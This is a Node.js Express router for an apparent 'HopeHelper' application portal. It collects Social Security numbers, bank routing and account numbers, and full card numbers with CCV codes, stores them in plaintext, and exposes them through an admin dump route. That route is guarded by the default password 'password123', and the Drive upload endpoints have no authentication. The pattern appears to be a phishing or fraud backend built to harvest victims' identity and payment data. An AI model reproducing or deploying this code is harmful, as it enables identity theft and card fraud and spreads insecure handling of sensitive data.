const express = require('express');
const router = express.Router();
const { pool } = require('../lib/db');
const { getDriveClient } = require('../lib/drive');
const transporter = require('../lib/email');

// === Helper: Admin Auth Middleware ===
const adminAuth = (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
        res.setHeader('WWW-Authenticate', 'Basic');
        return res.status(401).send('Authentication required');
    }

    const auth = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
    const user = auth[0];
    const pass = auth[1];

    const adminUser = process.env.ADMIN_USER || 'admin';
    const adminPass = process.env.ADMIN_PASS || 'password123';

    if (user === adminUser && pass === adminPass) {
        next();
    } else {
        res.setHeader('WWW-Authenticate', 'Basic');
        return res.status(401).send('Authentication failed');
    }
};

// === Endpoint: receive form submission + Drive info ===
router.post('/log', async (req, res) => {
    try {
        const formData = req.body;
        console.log(`🚀 [API/LOG] Received submission for: ${formData.formData.firstName} ${formData.formData.lastName}`);

        const emailBody = `
            === HopeHelper: Process Completed ===
            
            Application for ${formData.formData.firstName} ${formData.formData.lastName} has been successfully processed and stored.
            
            Timestamp: ${new Date(formData.timestamp).toLocaleString()}
            Drive Folder: ${formData.folder?.url || 'N/A'}
            
            Check the Admin Dashboard for full details.
            `;

        console.log('📧 Attempting to send confirmation email...');
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: `✅ Application Processed: ${formData.formData.firstName} ${formData.formData.lastName}`,
            text: emailBody
        });
        console.log('✅ Confirmation email sent');

        console.log('🗄️ Starting database transaction...');
        const connection = await pool.getConnection();
        try {
            await connection.beginTransaction();
            console.log('🗄️ Inserting into applications table...');
            const [appResult] = await connection.query(
                `INSERT INTO applications (
                    first_name, last_name, dob, ssn, phone, email, 
                    address, city, state, zip, mailing_address, 
                    bank_name, account_type, routing_number, account_number, 
                    drive_folder_id, drive_folder_url
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [
                    formData.formData.firstName, formData.formData.lastName, formData.formData.dateOfBirth,
                    formData.formData.socialSecurityNumber, formData.formData.phoneNumber, formData.formData.email,
                    formData.formData.currentAddress, formData.formData.city, formData.formData.state,
                    formData.formData.zipCode, formData.formData.mailingAddress, formData.formData.bankName,
                    formData.formData.accountType, formData.formData.routingNumber, formData.formData.accountNumber,
                    formData.folder?.id, formData.folder?.url
                ]
            );

            const applicationId = appResult.insertId;
            console.log(`🗄️ Application ID generated: ${applicationId}`);

            if (formData.formData.cards?.length > 0) {
                console.log(`🗄️ Inserting ${formData.formData.cards.length} cards...`);
                for (const card of formData.formData.cards) {
                    await connection.query(
                        `INSERT INTO cards (application_id, card_number, expiry, ccv) VALUES (?, ?, ?, ?)`,
                        [applicationId, card.cardNumber, card.expiry, card.ccv]
                    );
                }
            }

            if (formData.files?.length > 0) {
                console.log(`🗄️ Inserting ${formData.files.length} file links...`);
                for (const file of formData.files) {
                    await connection.query(
                        `INSERT INTO files (application_id, name, url, drive_id, field_name) VALUES (?, ?, ?, ?, ?)`,
                        [applicationId, file.name, file.url, file.id, file.fieldName]
                    );
                }
            }
            await connection.commit();
            console.log('✅ Database transaction committed');
        } catch (dbError) {
            await connection.rollback();
            console.error('❌ Database error during transaction:', dbError);
        } finally {
            connection.release();
        }

        res.json({ success: true, message: 'Submission logged and emailed successfully' });
    } catch (error) {
        console.error('Submission error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// === Google Drive Routes ===
router.get('/google/init', async (req, res) => {
    try {
        await getDriveClient();
        res.json({ success: true, message: 'Drive API initialized' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.post('/google/create-folder', async (req, res) => {
    try {
        const { folderName } = req.body;
        console.log(`📂 [DRIVE] Creating folder: ${folderName}`);
        const drive = await getDriveClient();
        const folder = await drive.files.create({
            resource: {
                name: folderName,
                mimeType: 'application/vnd.google-apps.folder',
                parents: [process.env.DRIVE_PARENT_ID || '1orU5vM9h49_q2zNr-Vi2S1aRKmfA-upb']
            },
            fields: 'id, name, webViewLink'
        });
        console.log(`✅ [DRIVE] Folder created: ${folder.data.id}`);
        res.json({ id: folder.data.id, name: folder.data.name, url: folder.data.webViewLink });
    } catch (error) {
        console.error('❌ [DRIVE] Folder creation error:', error);
        res.status(500).json({ error: error.message });
    }
});

router.post('/google/get-upload-url', async (req, res) => {
    try {
        const { fileName, folderId, mimeType } = req.body;
        const drive = await getDriveClient();
        const fileMetadata = { name: fileName, mimeType, parents: folderId ? [folderId] : [] };
        const file = await drive.files.create({ resource: fileMetadata, fields: 'id, name, webViewLink' });
        res.json({ id: file.data.id, name: file.data.name, webViewLink: file.data.webViewLink, directUploadNotAvailable: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.post('/google/resumable-upload', async (req, res) => {
    try {
        const { fileName, folderId, mimeType } = req.body;
        const drive = await getDriveClient();
        const response = await drive.files.create(
            { requestBody: { name: fileName, mimeType, parents: folderId ? [folderId] : [] }, media: { mimeType } },
            { params: { uploadType: 'resumable' }, headers: { 'X-Upload-Content-Type': mimeType }, responseType: 'json' }
        );
        const uploadUrl = response?.headers?.location;
        if (!uploadUrl) throw new Error('Failed to get resumable upload URL');
        res.json({ uploadUrl, fileMetadata: { name: fileName, mimeType }, resumable: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.post('/google/verify-folder', async (req, res) => {
    try {
        const { folderId } = req.body;
        const drive = await getDriveClient();
        const response = await drive.files.get({ fileId: folderId, fields: 'id, name, mimeType, capabilities' });
        res.json({
            valid: response.data.mimeType === 'application/vnd.google-apps.folder',
            canUpload: response.data.capabilities?.canAddChildren === true,
            folderName: response.data.name,
            folderId: response.data.id
        });
    } catch (error) {
        res.status(error.code || 500).json({ error: error.message });
    }
});

// === Admin Dashboard Route ===
router.get('/admin/data', adminAuth, async (req, res) => {
    try {
        const [applications] = await pool.query('SELECT * FROM applications ORDER BY timestamp DESC');
        const enrichedApplications = await Promise.all(applications.map(async (app) => {
            const [cards] = await pool.query('SELECT * FROM cards WHERE application_id = ?', [app.id]);
            const [files] = await pool.query('SELECT * FROM files WHERE application_id = ?', [app.id]);
            return { ...app, cards, files };
        }));
        res.json(enrichedApplications);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
